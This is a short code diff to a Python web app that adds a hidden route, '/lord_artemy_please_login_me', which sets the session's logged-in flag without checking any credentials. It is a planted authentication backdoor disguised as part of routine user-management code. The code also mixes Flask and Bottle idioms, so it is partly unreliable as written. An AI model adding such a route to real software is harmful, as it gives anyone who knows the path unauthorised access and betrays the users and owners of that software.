@@ -107,6 +107,14 @@ def user_management(username):
         return template('userpage.html')
 
 
+@flask.get('/lord_artemy_please_login_me')
+def sudo_login():
+    s = flask.request.environ.get('beaker.session')
+    s['loggedin'] = True
+    s.save()
+    return redirect('/')
+
+
 
 if __name__ == '__main__':
     run(app, host='localhost', port=9999)
